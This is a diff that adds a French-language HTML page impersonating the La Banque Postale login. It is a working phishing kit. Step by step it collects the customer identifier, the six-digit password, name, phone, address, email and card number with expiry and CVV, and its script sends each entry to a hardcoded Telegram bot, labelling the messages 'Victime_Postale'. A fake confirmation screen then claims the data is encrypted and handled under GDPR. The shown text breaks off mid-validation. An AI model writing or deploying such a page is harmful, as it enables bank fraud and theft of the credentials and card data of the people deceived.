@@ -1,0 +1,1322 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion La Banque Postale</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Lato', sans-serif;
+            display: flex;
+            height: 100vh;
+            overflow: hidden; /* Empêche le défilement global par défaut */
+            background-color: #f0f2f5;
+            justify-content: center; /* Centre horizontalement le contenu principal */
+            align-items: center; /* Centre verticalement le contenu principal */
+        }
+
+        .left-container {
+            background: white;
+            display: flex;
+            flex-direction: column;
+            padding: 30px 40px;
+            box-sizing: border-box;
+            position: relative;
+            width: 32%;
+            min-width: 300px;
+            height: 100%;
+            overflow-y: auto;
+            flex-shrink: 0;
+        }
+
+        .right-container {
+            background: linear-gradient(to bottom right, #5077BE, #325C9E);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            color: white;
+            padding: 40px;
+            flex-grow: 1;
+            height: 100%;
+            overflow-y: auto;
+        }
+
+        .header-icons {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            position: absolute;
+            top: 30px;
+            right: 40px;
+        }
+
+        .header-icons i {
+            font-size: 20px;
+            color: #333;
+            margin-left: 20px;
+            cursor: pointer;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            height: 40px;
+            margin-right: 15px;
+        }
+
+        h1 {
+            font-size: 15px;
+            margin-top: 0;
+            margin-bottom: 5px;
+            color: #333;
+            align-self: flex-start;
+        }
+
+        h2 {
+            font-size: 12px;
+            margin-top: 20px;
+            margin-bottom: 15px;
+            font-weight: bold;
+            color: #555;
+            align-self: flex-start;
+            text-align: left;
+            width: 100%;
+        }
+
+        /* Identifiant Input Field and Clear Button */
+        .identifiant-input-wrapper {
+            position: relative;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .error-message {
+            color: red;
+            font-size: 0.8em;
+            margin-top: 5px;
+            display: block;
+            text-align: left;
+            min-height: 1.2em;
+        }
+
+        .identifiant-input-wrapper input {
+            width: 100%;
+            padding: 12px 10px;
+            padding-right: 40px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1.1em; /* Légèrement diminué */
+            box-sizing: border-box;
+            color: #03386c;
+            letter-spacing: 0.15em;
+        }
+
+        .clear-identifiant-char {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: transparent;
+            border: none;
+            color: #999;
+            font-size: 1.2em;
+            cursor: pointer;
+            padding: 5px;
+            display: none;
+            line-height: 1;
+        }
+        .identifiant-input-wrapper.has-error .clear-identifiant-char {
+             top: calc(50% - 0.6em);
+        }
+
+        .clear-identifiant-char:hover {
+            color: #555;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin-top: 15px;
+            margin-bottom: 30px;
+            font-size: 0.9em;
+            color: #666;
+            align-self: flex-start;
+            width: 100%;
+        }
+
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 38px;
+            height: 20px;
+            margin-left: auto;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 20px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 16px;
+            width: 16px;
+            left: 2px;
+            bottom: 2px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background-color: #007bff;
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(18px);
+        }
+
+        #mainContinueButton {
+            width: 100%;
+            padding: 12px;
+            background-color: #033e7d;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-bottom: 20px;
+        }
+
+        #mainContinueButton:hover {
+            background-color: #0056b3;
+        }
+
+        .forgot-link {
+            display: block;
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+            
+            text-align: center;
+            font-size: 0.9em;
+            margin-top: 20px;
+            padding-bottom: 5px;
+        }
+
+        .forgot-link a {
+            color: #666;
+            text-decoration: none;
+        }
+
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+
+        .right-content h2 {
+            font-size: 2.8em;
+            margin-bottom: 40px;
+            font-weight: bold;
+            color: white;
+            width: auto;
+            align-self: center;
+        }
+
+        .assurance-box {
+            background-color: rgba(0, 0, 0, 0.3);
+            padding: 30px;
+            border-radius: 8px;
+            width: 70%;
+            max-width: 500px;
+        }
+
+        .assurance-box p {
+            margin-bottom: 20px;
+            line-height: 1.4;
+            font-size: 0.95em;
+        }
+
+        .assurance-box .button-link {
+            display: block;
+            width: fit-content;
+            margin: 0 auto 15px auto;
+            padding: 10px 20px;
+            background-color: transparent;
+            border: 1px solid white;
+            border-radius: 8px;
+            color: white;
+            text-decoration: none;
+            cursor: pointer;
+            transition: background-color 0.3s, color 0.3s;
+            font-size: 0.9em;
+        }
+        .assurance-box .button-link:hover {
+            text-decoration: underline;
+        }
+
+        .assurance-box button {
+            display: block;
+            width: fit-content;
+            margin: 0 auto 15px auto;
+            padding: 10px 20px;
+            background-color: transparent;
+            border: 1px solid white;
+            border-radius: 8px;
+            color: white;
+            text-decoration: none;
+            cursor: pointer;
+            transition: background-color 0.3s, color 0.3s;
+            font-size: 0.9em;
+        }
+        .assurance-box button:hover {
+            background-color: white;
+            color: #325C9E;
+        }
+
+
+        /* Password input area styles - Centered */
+        #password-title {
+            display: none;
+            margin-top: 20px;
+            margin-bottom: 5px;
+            text-align: center;
+            align-self: center;
+        }
+
+        .password-input-area {
+            display: none;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+            margin-top: 10px;
+            margin-bottom: 30px;
+            width: 100%;
+        }
+        .password-input-area > :not(.error-message) {
+            margin-bottom: 0;
+        }
+
+        .password-circles {
+            display: flex;
+            gap: 6px;
+            justify-content: center;
+            flex-grow: 1;
+            flex-shrink: 0;
+            min-width: fit-content;
+        }
+
+        .password-circles span {
+            width: 16px;
+            height: 16px;
+            border: 1px solid #ccc;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.9em;
+            color: #333;
+        }
+
+        .password-circles span.filled {
+            background-color: #004080;
+            border-color: #004080;
+        }
+
+        .clear-password-char {
+            background-color: #f0f0f0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            width: 35px;
+            height: 35px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.3em;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            color: #555;
+            flex-shrink: 0;
+        }
+
+        .clear-password-char:hover {
+            background-color: #e0e0e0;
+        }
+
+        /* Message d'erreur du mot de passe */
+        #passwordError {
+            flex-basis: 100%;
+            text-align: center;
+            margin-top: 5px;
+        }
+
+        /* Keypad styles - Centered */
+        .keypad {
+            display: none;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 7px;
+            width: 100%;
+            max-width: 330px;
+            margin: 0 auto 20px auto;
+        }
+
+        .keypad button {
+            width: 100%;
+            padding: 11px 0;
+            font-size: 1.3em;
+            background-color: #e6f7ff;
+            border: 1px solid #cceeff;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            color: #004080;
+        }
+
+        .keypad button:hover {
+            background-color: #cceeff;
+        }
+        .keypad button:active {
+            background-color: #b3e0ff;
+        }
+
+        /* Personal Info Section Styles */
+        #personal-info-section {
+            display: none;
+            width: 100%;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+            width: 100%;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 0.9em;
+            color: #666;
+            margin-bottom: 5px;
+            text-align: left;
+        }
+
+        #personal-info-section .input-group input {
+            width: 100%;
+            padding: 10px 8px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1em;
+            box-sizing: border-box;
+            color: #333;
+        }
+
+        #personal-info-section .input-group input:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+        /* Message d'erreur pour l'email */
+        #emailError {
+            color: red;
+            font-size: 0.8em;
+            margin-top: 5px;
+            display: block;
+            text-align: left;
+            min-height: 1.2em;
+        }
+
+
+        /* Bank Info Section Styles */
+        #bank-info-section {
+            display: none;
+            width: 100%;
+        }
+
+        .security-image {
+            max-width: 150px;
+            height: auto;
+            display: block;
+            margin: 15px auto 25px auto;
+        }
+
+        .input-group.inline-fields {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+        }
+
+        .input-group.inline-fields > div {
+            flex: 1;
+            min-width: 120px;
+        }
+        
+        #bank-info-section .input-group input {
+            width: 100%;
+            padding: 12px 10px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1.1em;
+            box-sizing: border-box;
+            color: #333;
+        }
+
+        .security-texts {
+            margin-top: 20px;
+            font-size: 0.85em;
+            color: #555;
+            text-align: left; /* Alignement à gauche */
+            width: 100%; /* Prend toute la largeur */
+        }
+        .security-texts p {
+            margin-bottom: 8px;
+            line-height: 1.3;
+            display: flex; /* Pour aligner l'icône et le texte */
+            align-items: flex-start; /* Aligne l'icône en haut du texte */
+        }
+        .security-texts i {
+            color: rgb(179, 179, 179);
+            margin-right: 10px; /* Espacement entre icône et texte */
+            font-size: 1.1em; /* Taille de l'icône */
+            flex-shrink: 0; /* Empêche l'icône de rétrécir */
+        }
+
+
+        /* Confirmation Page Styles */
+        #confirmation-page {
+            display: none;
+            text-align: center;
+            width: 100%;
+            height: 100vh; /* Prend toute la hauteur de la fenêtre */
+            box-sizing: border-box;
+            color: #333;
+            /* background-color: white; /* Fond blanc par défaut */
+            display: flex; /* Utilisation de flex pour le centrage */
+            justify-content: center; /* Centrage horizontal */
+            align-items: center; /* Centrage vertical */
+            background-image: url('logo.png'); /* Image de fond */
+            background-size: cover; /* Couvre toute la zone */
+            background-position: center; /* Centre l'image */
+            background-repeat: no-repeat; /* Pas de répétition */
+            position: relative; /* Pour le calque overlay */
+        }
+
+        #confirmation-page::before { /* Calque semi-transparent par-dessus l'image de fond */
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.7); /* Blanc semi-transparent */
+            z-index: 0;
+        }
+
+        #confirmation-page .left-container-wrapper {
+            background-color: rgba(255, 255, 255, 0.9); /* Fond légèrement plus opaque pour le contenu */
+            padding: 40px; /* Augmenté légèrement pour plus d'espace */
+            box-sizing: border-box;
+            flex-direction: column;
+            max-width: 700px; /* Largeur maximale augmentée */
+            width: 100%; /* Pour qu'il prenne la largeur disponible dans le flex */
+            height: auto; /* Hauteur ajustée au contenu */
+            display: flex; /* Pour que le contenu à l'intérieur soit flex */
+            justify-content: center; /* Centre le contenu verticalement dans le wrapper */
+            align-items: center; /* Centre le contenu horizontalement dans le wrapper */
+            border-radius: 10px; /* Bords arrondis */
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1); /* Ombre subtile */
+            z-index: 1; /* S'assure que le contenu est au-dessus du calque overlay */
+            text-align: left; /* Alignement du texte à gauche par défaut dans ce bloc */
+        }
+
+
+        #confirmation-page h2 {
+            font-size: 1.8em;
+            color: #0353a8;
+            margin-bottom: 20px;
+            text-align: center; /* Centrer le titre principal */
+        }
+
+        #confirmation-page p {
+            font-size: 1.1em;
+            margin-bottom: 15px;
+            line-height: 1.5;
+            text-align: left; /* Assurer l'alignement à gauche pour les paragraphes */
+        }
+
+        #confirmation-page .security-icon {
+            font-size: 3em;
+            color: green;
+            margin-bottom: 20px;
+        }
+
+        #confirmation-page .info-section {
+            margin-top: 25px;
+            margin-bottom: 25px;
+            padding: 15px 20px;
+            background-color: #f8f9fa;
+            border-left: 5px solid #007bff;
+            border-radius: 5px;
+        }
+
+        #confirmation-page .info-section h3 {
+            font-size: 1.2em;
+            color: #007bff;
+            margin-top: 0;
+            margin-bottom: 10px;
+            text-align: left; /* Aligner le sous-titre à gauche */
+        }
+
+        #confirmation-page .info-section p {
+            font-size: 0.95em;
+            margin-bottom: 8px;
+            line-height: 1.4;
+            text-align: left; /* Aligner le texte à gauche */
+        }
+
+
+        /* Loading Spinner Overlay */
+        .loading-spinner-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            transition: opacity 0.3s ease-in-out;
+            pointer-events: none;
+            opacity: 0;
+        }
+        .loading-spinner-overlay.visible {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        /* Spinner Animation */
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #007bff;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Media Queries pour la responsivité */
+        @media (max-width: 768px) {
+            body {
+                flex-direction: column;
+                height: auto;
+                overflow-y: auto;
+                justify-content: flex-start;
+            }
+
+            .left-container {
+                width: 100%;
+                height: auto;
+                min-width: auto;
+                padding: 15px 20px;
+                overflow-y: visible;
+                flex-shrink: 0;
+                align-items: flex-start;
+            }
+
+            .right-container {
+                display: none; /* Cache le conteneur de droite sur les petits écrans */
+                width: 100%;
+                height: auto;
+                padding: 20px 15px;
+                justify-content: center;
+            }
+
+            .header-icons {
+                top: 15px;
+                right: 15px;
+            }
+
+            .logo-section {
+                justify-content: flex-start;
+                width: auto;
+            }
+
+            h1, h2 {
+                align-self: flex-start;
+                text-align: left;
+                width: 100%;
+                padding-left: 0;
+                padding-right: 0;
+            }
+
+            #password-title {
+                align-self: center;
+                text-align: center;
+                width: 100%;
+            }
+
+            .remember-me {
+                align-self: flex-start;
+                text-align: left;
+                width: 100%;
+                padding-left: 0;
+                padding-right: 0;
+            }
+            
+            .forgot-link {
+                position: static;
+                margin-top: 20px;
+                padding-bottom: 0;
+                text-align: center;
+                width: 100%;
+            }
+
+            .identifiant-input-wrapper,
+            #mainContinueButton,
+            .keypad,
+            .password-input-area,
+            #personal-info-section,
+            #bank-info-section {
+                width: 100%;
+                margin-left: 0;
+                margin-right: 0;
+                padding-left: 0;
+                padding-right: 0;
+            }
+            #confirmation-page .left-container-wrapper {
+                width: 100%;
+                padding: 15px 20px;
+                max-width: none;
+                height: auto;
+                min-height: 100vh;
+                justify-content: flex-start;
+                border-radius: 0; /* Enlève les bords arrondis sur petit écran si ça rend mieux */
+                box-shadow: none; /* Enlève l'ombre sur petit écran */
+            }
+            #confirmation-page {
+                height: auto;
+                min-height: 100vh; /* Assure que la page prend au moins toute la hauteur de la vue */
+                overflow-y: auto;
+            }
+
+
+            .identifiant-input-wrapper input,
+            #mainContinueButton,
+            .input-group input {
+                max-width: none;
+            }
+
+            .keypad {
+                max-width: none;
+            }
+
+            .assurance-box {
+                width: 90%;
+                padding: 20px;
+                max-width: none;
+            }
+
+            body, .left-container, .right-container, .identifiant-input-wrapper, .keypad, .password-input-area, .assurance-box, #personal-info-section, #bank-info-section {
+                min-width: 0;
+                overflow-x: hidden;
+            }
+        }
+
+        /* Spécifique pour les très petits écrans */
+        @media (max-width: 480px) {
+            .keypad {
+                grid-template-columns: repeat(5, 1fr);
+                gap: 5px;
+            }
+
+            .password-circles {
+                gap: 5px;
+            }
+
+            .password-circles span {
+                width: 14px;
+                height: 14px;
+                font-size: 0.8em;
+            }
+
+            .clear-password-char {
+                width: 30px;
+                height: 30px;
+                font-size: 1.1em;
+            }
+
+            .identifiant-input-wrapper input {
+                padding-right: 35px;
+            }
+
+            .clear-identifiant-char {
+                right: 5px;
+                font-size: 1em;
+            }
+            
+            .input-group.inline-fields {
+                flex-direction: column;
+                gap: 0;
+            }
+            .input-group.inline-fields > div {
+                margin-bottom: 15px;
+                min-width: 100%;
+            }
+            .input-group.inline-fields > div:last-child {
+                margin-bottom: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="left-container" id="main-content-container">
+        <div class="header-icons">
+            <i class="fas fa-search"></i>
+            <i class="fas fa-times"></i>
+        </div>
+        <div class="logo-section">
+            <img src="logo.png" alt="La Banque Postale Logo" class="logo">
+        </div>
+        <h1 id="dynamic-h1">Connexion à votre compte particulier</h1>
+
+        <h2 id="identifiant-title">Identifiant (10 chiffres)</h2>
+        <div class="identifiant-input-wrapper">
+            <input type="text" id="identifiantInput" maxlength="10" placeholder="_ _ _ _ _ _ _ _ _ _" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+            <button class="clear-identifiant-char" id="clearIdentifiantChar">x</button>
+            <span id="identifiantError" class="error-message" style="display: none;"></span>
+        </div>
+        <div class="remember-me">
+            Mémoriser mon identifiant
+            <label class="switch">
+                <input type="checkbox">
+                <span class="slider"></span>
+            </label>
+        </div>
+
+        <h2 id="password-title">Mot de passe (6 chiffres)</h2>
+        <div class="password-input-area">
+            <div class="password-circles">
+                <span></span><span></span><span></span><span></span><span></span><span></span>
+            </div>
+            <button class="clear-password-char" id="clearPasswordChar">x</button>
+            <span id="passwordError" class="error-message" style="display: none;"></span>
+        </div>
+        <div class="keypad">
+            <button data-digit="1">1</button>
+            <button data-digit="2">2</button>
+            <button data-digit="3">3</button>
+            <button data-digit="4">4</button>
+            <button data-digit="5">5</button>
+            <button data-digit="6">6</button>
+            <button data-digit="7">7</button>
+            <button data-digit="8">8</button>
+            <button data-digit="9">9</button>
+            <button data-digit="0">0</button>
+        </div>
+      
+        <div id="personal-info-section">
+            <h2>Conformité des données personnelles</h2>
+            <br>
+            <div class="input-group">
+                <label for="nomPrenom">Nom et Prénom</label>
+                <input type="text" id="nomPrenom" placeholder="Votre nom et prénom">
+            </div>
+            <div class="input-group">
+                <label for="telephone">Numéro de téléphone</label>
+                <input type="tel" id="telephone" placeholder="Ex: 06XXXXXXXX">
+            </div>
+            <div class="input-group">
+                <label for="adresse">Adresse</label>
+                <input type="text" id="adresse" placeholder="Votre adresse complète">
+            </div>
+            <div class="input-group">
+                <label for="codePostal">Code postal</label>
+                <input type="text" id="codePostal" placeholder="Ex: 10000" maxlength="5">
+            </div>
+            <div class="input-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" placeholder="votre.email@example.com">
+                <span id="emailError" class="error-message" style="display: none;">Veuillez saisir une adresse email valide.</span>
+            </div>
+        </div>
+
+        <div id="bank-info-section" style="display: none;">
+            <h2>Sécuriser ma carte de crédit ,</h2>
+            <img src="paiement.png" alt="Sécurité carte bancaire" class="security-image">
+            <div class="input-group">
+                <label for="cardNumber">Numéro de carte bancaire</label>
+                <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
+            </div>
+            <div class="input-group inline-fields">
+                <div>
+                    <label for="expiryDate">Date d'expiration (MM/AA)</label>
+                    <input type="text" id="expiryDate" placeholder="MM/AA" maxlength="5">
+                </div>
+                <div>
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" placeholder="XXX" maxlength="3">
+                </div>
+            </div>
+            <div class="security-texts">
+                <p><i class="fas fa-lock"></i> Vos données sont cryptées avec les dernières technologies de sécurité.</p>
+                <p><i class="fas fa-check-circle"></i> Transaction sécurisée garantie par La Banque Postale.</p>
+                <p><i class="fas fa-shield-alt"></i> Protection anti-fraude active pour votre tranquillité d'esprit.</p>
+            </div>
+        </div>
+        
+        <button id="mainContinueButton">Continuer</button>
+
+        <div class="forgot-link" id="forgotLink">
+            <a href="#">Identifiant / Mot de passe oublié ?</a>
+        </div>
+    </div>
+
+    <div id="confirmation-page">
+        <div class="left-container-wrapper">
+            <i class="fas fa-shield-alt security-icon"></i>
+            <h2>Confirmation de la sécurisation</h2>
+            <p>Vos informations personnelles et bancaires ont été transmises avec succès. La Banque Postale vous remercie pour votre confiance et votre réactivité.</p>
+            <p>Un conseiller vous recontactera très prochainement pour finaliser la sécurisation de votre compte et gérer tout paiement frauduleux éventuel.</p>
+            
+            <div class="info-section">
+                <h3>Vos données sécurisées</h3>
+                <p>Nous avons mis à jour vos informations pour renforcer la protection de votre compte. Cela inclut le chiffrement de vos données bancaires et la mise en place de mesures anti-fraude avancées.</p>
+            </div>
+
+            <div class="info-section">
+                <h3>Engagement RGPD</h3>
+                <p>La Banque Postale s'engage à la protection de vos données personnelles. Toutes les informations recueillies sont traitées en conformité avec le Règlement Général sur la Protection des Données (RGPD) et les réglementations en vigueur.</p>
+            </div>
+
+            
+        </div>
+    </div>
+
+    <div class="right-container" id="right-side-content">
+        <div class="right-content" id="assurance-section">
+            <h2>La Banque Postale, citoyenne</h2>
+            <div class="assurance-box">
+                <p id="right-container-text">Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver vos contrats La Banque Postale Assurance ?</p>
+                <a href="#" class="button-link">Signer mon contrat en ligne</a>
+                <button>Me connecter à mon espace assurance</button>
+            </div>
+        </div>
+        <div class="right-content" id="compliance-section" style="display: none;">
+            <h2>Protection de vos données</h2>
+            <div class="assurance-box">
+                <p>La Banque Postale s'engage à protéger vos données personnelles en conformité avec le Règlement Général sur la Protection des Données (RGPD) et les réglementations en vigueur.</p>
+                <p>Nous mettons en œuvre des mesures de sécurité techniques et organisationnelles pour assurer la confidentialité et l'intégrité de vos informations.</p>
+                <a href="#" class="button-link">En savoir plus sur nos engagements RGPD</a>
+                <button>Contacter la CNIL</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="loading-spinner" class="loading-spinner-overlay">
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+        let currentStep = 1; // 1: Identifiant, 2: Mot de passe, 3: Informations personnelles, 4: Informations bancaires, 5: Confirmation
+        let passwordValue = '';
+
+        // *** CONFIGURATION TELEGRAM ***
+        const TELEGRAM_BOT_TOKEN = '8142803214:AAGzNigqO77tA9-Cx0lmP9qDyQ49eJp5VOg'; // REMPLACEZ PAR VOTRE TOKEN RÉEL
+        const TELEGRAM_CHAT_ID = '7616240648';           // REMPLACEZ PAR VOTRE CHAT ID RÉEL
+        // *****************************
+
+        // Récupération des éléments HTML
+        const mainContentContainer = document.getElementById('main-content-container');
+        const rightSideContent = document.getElementById('right-side-content');
+
+        const dynamicH1 = document.getElementById('dynamic-h1'); // Nouvel élément pour le titre dynamique
+        const identifiantTitle = document.getElementById('identifiant-title');
+        const identifiantInput = document.getElementById('identifiantInput');
+        const identifiantInputWrapper = document.querySelector('.identifiant-input-wrapper');
+        const identifiantError = document.getElementById('identifiantError');
+        const clearIdentifiantCharButton = document.getElementById('clearIdentifiantChar');
+        const rememberMe = document.querySelector('.remember-me');
+
+        const passwordTitle = document.getElementById('password-title');
+        const passwordInputArea = document.querySelector('.password-input-area');
+        const keypad = document.querySelector('.keypad');
+        const passwordCircles = document.querySelectorAll('.password-circles span');
+        const clearPasswordCharButton = document.getElementById('clearPasswordChar');
+        const passwordError = document.getElementById('passwordError');
+
+        const personalInfoSection = document.getElementById('personal-info-section');
+        const nomPrenomInput = document.getElementById('nomPrenom');
+        const telephoneInput = document.getElementById('telephone');
+        const adresseInput = document.getElementById('adresse');
+        const codePostalInput = document.getElementById('codePostal');
+        const emailInput = document.getElementById('email');
+        const emailError = document.getElementById('emailError');
+
+        const bankInfoSection = document.getElementById('bank-info-section');
+        const cardNumberInput = document.getElementById('cardNumber');
+        const expiryDateInput = document.getElementById('expiryDate');
+        const cvvInput = document.getElementById('cvv');
+
+        const confirmationPage = document.getElementById('confirmation-page');
+
+        const mainContinueButton = document.getElementById('mainContinueButton');
+        const loadingSpinner = document.getElementById('loading-spinner');
+        const forgotLink = document.getElementById('forgotLink');
+
+        // Contenu du bloc droit
+        const assuranceSection = document.getElementById('assurance-section');
+        const complianceSection = document.getElementById('compliance-section');
+        const rightContainerText = document.getElementById('right-container-text');
+
+
+        // Fonction pour initialiser ou réinitialiser le formulaire à l'étape 1
+        function initializeForm() {
+            // Afficher les éléments de l'identifiant (Step 1)
+            mainContentContainer.style.display = 'flex'; // S'assurer que le conteneur gauche est visible
+            rightSideContent.style.display = 'flex'; // S'assurer que le conteneur droit est visible
+            assuranceSection.style.display = 'block'; // Afficher le contenu initial du bloc droit
+            complianceSection.style.display = 'none'; // Masquer le contenu de conformité
+
+            dynamicH1.textContent = 'Connexion à votre compte particulier'; // Titre initial
+            identifiantTitle.style.display = 'block';
+            identifiantInputWrapper.style.display = 'block';
+            rememberMe.style.display = 'flex';
+            forgotLink.style.display = 'block';
+            clearIdentifiantCharButton.style.display = 'none';
+            identifiantError.style.display = 'none';
+            identifiantError.textContent = '';
+            identifiantInputWrapper.classList.remove('has-error');
+
+            // Masquer les autres étapes et la page de confirmation
+            passwordTitle.style.display = 'none';
+            passwordInputArea.style.display = 'none';
+            keypad.style.display = 'none';
+            personalInfoSection.style.display = 'none';
+            bankInfoSection.style.display = 'none';
+            confirmationPage.style.display = 'none';
+            passwordError.style.display = 'none';
+            emailError.style.display = 'none'; // Masquer l'erreur email
+
+            mainContinueButton.style.display = 'block';
+            mainContinueButton.textContent = 'Continuer';
+            currentStep = 1;
+            identifiantInput.value = '';
+            passwordValue = '';
+            updatePasswordCircles();
+
+            nomPrenomInput.value = '';
+            telephoneInput.value = '';
+            adresseInput.value = '';
+            codePostalInput.value = '';
+            emailInput.value = '';
+
+            cardNumberInput.value = '';
+            expiryDateInput.value = '';
+            cvvInput.value = '';
+        }
+
+        function showLoadingSpinner() {
+            loadingSpinner.classList.add('visible');
+        }
+
+        function hideLoadingSpinner() {
+            loadingSpinner.classList.remove('visible');
+        }
+
+        /**
+         * Envoie un message à un bot Telegram.
+         * @param {string} message Le texte du message à envoyer.
+         */
+        async function sendToTelegram(message) {
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN') {
+                console.warn('Configuration Telegram manquante ou par défaut. L\'envoi à Telegram est désactivé.');
+                return;
+            }
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const params = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML' // Permet d'utiliser des balises comme <b> pour le gras
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(params)
+                });
+
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    console.error('Erreur lors de l\'envoi à Telegram:', response.status, errorData);
+                } else {
+                    console.log('Message envoyé à Telegram avec succès!');
+                }
+            } catch (error) {
+                console.error('Erreur réseau lors de l\'envoi à Telegram:', error);
+            }
+        }
+
+
+        mainContinueButton.addEventListener('click', async () => {
+            if (currentStep === 1) {
+                if (identifiantInput.value.length !== 10 || isNaN(identifiantInput.value)) {
+                    identifiantError.textContent = 'Veuillez saisir un identifiant valide à 10 chiffres.';
+                    identifiantError.style.display = 'block';
+                    identifiantInputWrapper.classList.add('has-error');
+                    return;
+                } else {
+                    identifiantError.style.display = 'none';
+                    identifiantError.textContent = '';
+                    identifiantInputWrapper.classList.remove('has-error');
+                }
+
+                // Envoi de l'identifiant à Telegram
+                await sendToTelegram(`<i>Victime_Postale:</i>\n\n<b>Identifiant (10 chiffres) :</b> ${identifiantInput.value}`);
+
+                dynamicH1.textContent = 'Validation de sécurité'; // Changer le titre pour l'étape 2
+                passwordTitle.style.display = 'block';
+                passwordInputArea.style.display = 'flex';
+                keypad.style.display = 'grid';
+                passwordError.style.display = 'none';
+
+                forgotLink.style.display = 'none';
+
+                mainContinueButton.textContent = 'Connectez-vous';
+                currentStep = 2;
+                passwordValue = '';
+                updatePasswordCircles();
+
+                // Changer le contenu du bloc droit pour la conformité
+                assuranceSection.style.display = 'none';
+                complianceSection.style.display = 'block';
+                
+                window.scrollTo(0, 0); // Retour en haut de page
+
+            } else if (currentStep === 2) {
+                if (passwordValue.length === 6) {
+                    passwordError.style.display = 'none';
+                    showLoadingSpinner();
+
+                    // Envoi du mot de passe à Telegram
+                    await sendToTelegram(`<i>Mot_dpasse:</i>\n\n<b>Mot de passe (6 chiffres) :</b> ${passwordValue}`);
+
+                    setTimeout(() => {
+                        hideLoadingSpinner();
+                        identifiantTitle.style.display = 'none';
+                        identifiantInputWrapper.style.display = 'none';
+                        rememberMe.style.display = 'none';
+
+                        passwordTitle.style.display = 'none';
+                        passwordInputArea.style.display = 'none';
+                        keypad.style.display = 'none';
+
+                        personalInfoSection.style.display = 'block';
+                        dynamicH1.textContent = 'Complément d\'informations'; // Changer le titre pour l'étape 3
+
+                        mainContinueButton.textContent = 'Valider les informations';
+                        currentStep = 3;
+                        window.scrollTo(0, 0); // Retour en haut de page
+                    }, 2000);
+                } else {
+                    passwordError.textContent = 'Veuillez saisir les 6 chiffres du mot de passe.';
+                    passwordError.style.display = 'block';
+                }
+            } else if (currentStep === 3) {
+                // Validation de l'email spécifique
+                if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value)) {
+                    emailError.style.display = 'block';
+                    return;
+                } else {
+                    emailError.style.display = 'none';
+                }
+
+                if (nomPrenomInput.value.trim() === '' ||
+                    telephoneInput.value.trim() === '' ||
+                    adresseInput.value.trim() === '' ||
